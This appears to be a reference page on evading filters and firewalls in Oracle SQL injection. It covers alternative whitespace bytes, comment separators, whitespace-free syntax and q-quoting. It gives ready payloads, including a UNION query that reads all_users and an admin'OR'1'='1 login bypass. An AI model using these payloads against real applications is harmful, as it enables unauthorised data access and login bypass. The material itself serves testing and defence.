---
title: Fuzzing and Obfuscation
description: Whitespace, comment and quoting tricks for bypassing filters in Oracle SQL injection
category: Advanced Techniques
order: 15
tags: ["obfuscation", "WAF bypass", "filter evasion", "whitespace"]
lastUpdated: 2026-10-08
---

Filters and web application firewalls often look for keywords separated by spaces, or for quotes. Oracle's lexer accepts several alternatives. Everything below was checked on Oracle 21c and 23ai.

## Allowed Intermediary Characters (Whitespace)

| Hex      | Description       | URL Encoded |
| -------- | ----------------- | ----------- |
| `0x00`   | Null              | `%00`       |
| `0x09`   | Horizontal Tab    | `%09`       |
| `0x0A`   | Line Feed         | `%0A`       |
| `0x0B`   | Vertical Tab      | `%0B`       |
| `0x0C`   | Form Feed         | `%0C`       |
| `0x0D`   | Carriage Return   | `%0D`       |
| `0x20`   | Space             | `%20`       |
| `U+3000` | Ideographic Space | `%E3%80%80` |

The null byte is ordinary whitespace in Oracle, not a terminator: `SELECT%001%00FROM%00dual` returns `1`, as long as the application and driver pass the byte through. The other control characters (`0x01`-`0x08`, `0x0E`-`0x1F`) and the no-break space (`U+00A0`) fail with `ORA-00911: invalid character`. `U+3000` needs a Unicode database character set such as `AL32UTF8`, the default since 12.2.

## Comments as Whitespace

A block comment separates tokens like a space:

```sql
SELECT/**/username/**/FROM/**/all_users/**/WHERE/**/ROWNUM=1

-- In a UNION payload
' UNION/**/SELECT/**/username,NULL/**/FROM/**/all_users--
```

A `--` comment ends only at a line feed. A carriage return does not end it, unlike PostgreSQL and SQL Server, and `#` is not a comment (`ORA-00911`). See [Comment Out Query](/oracle/comment-out-query).

## No Whitespace at All

Parentheses and quotes delimit tokens, so many payloads need no separator:

```sql
SELECT(1)FROM(dual)WHERE(1)=(1)

-- Login bypass without spaces
admin'OR'1'='1
```

Keywords are case-insensitive, so `sElEcT` and `UnIoN` defeat filters that match one case.

## Alternative Quoting

The `q'` syntax (10g+) takes a delimiter of choice, so a quote inside the string needs no doubling. The pairs `[]`, `{}`, `()` and `<>` are used as opening and closing delimiters, and any other character is used on both sides:

```sql
SELECT q'[it's]' FROM dual
SELECT q'{it's}' FROM dual
SELECT q'!it's!' FROM dual

-- National character set variant
SELECT nq'[it's]' FROM dual
```

To avoid quotes entirely, build strings with `CHR()` as described in [Avoiding Quotations](/oracle/avoiding-quotations).
